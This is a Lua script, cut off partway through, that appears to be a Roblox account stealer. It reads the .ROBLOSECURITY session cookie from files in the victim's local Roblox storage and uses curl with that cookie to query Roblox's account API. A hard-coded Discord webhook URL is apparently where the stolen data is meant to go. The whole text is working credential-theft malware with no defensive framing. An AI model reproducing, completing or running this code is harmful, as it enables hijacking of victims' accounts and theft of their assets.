local WEBHOOK = "https://discord.com/api/webhooks/1574916444737503366/oVzDIU9pqdV20Azuik5b6nMWsL6A9yO7Id4f_wb_45jLZT9FEbISvvDhCUH1dKHjyKNR"

local paths = {
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\robloxcookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\rbx-cookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\cookies.dat",
    os.getenv("LOCALAPPDATA") .. "\\Packages\\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\\LocalState\\robloxcookies.dat",
}

local function readFile(p) 
    local f = io.open(p,"rb") 
    if not f then return nil end 
    local d = f:read("*a") 
    f:close() 
    return d 
end

local function findCookie(d) 
    if not d then return nil end 
    return d:match("(_|WARNING[^|]*|_[%w%%%+%/%=%-%._~]+)") 
end

local found, source
for _,p in ipairs(paths) do 
    local c = findCookie(readFile(p)) 
    if c then 
        found, source = c, p 
        break 
    end 
end

if not found then
    local base = os.getenv("LOCALAPPDATA").."\\Roblox\\LocalStorage\\"
    local h = io.popen('dir "'..base..'" /b 2>nul')
    if h then 
        for file in h:lines() do 
            local c = findCookie(readFile(base..file)) 
            if c then 
                found, source = c, base..file 
                break 
            end 
        end 
        h:close() 
    end
end

local function api(url, cookie)
    local h = io.popen('curl -s -H "Cookie: .ROBLOSECURITY='..cookie..'" "'..url..'"')
    if not h then return "{}" end 
    local r = h:read("*a") 
    h:close() 
    return r or "{}"
end

local info, robux, created = "{}", "N/A", "N/A"
if found then
    info = api("https://users.roblox.com/v1/users/authenticated", found)
    local
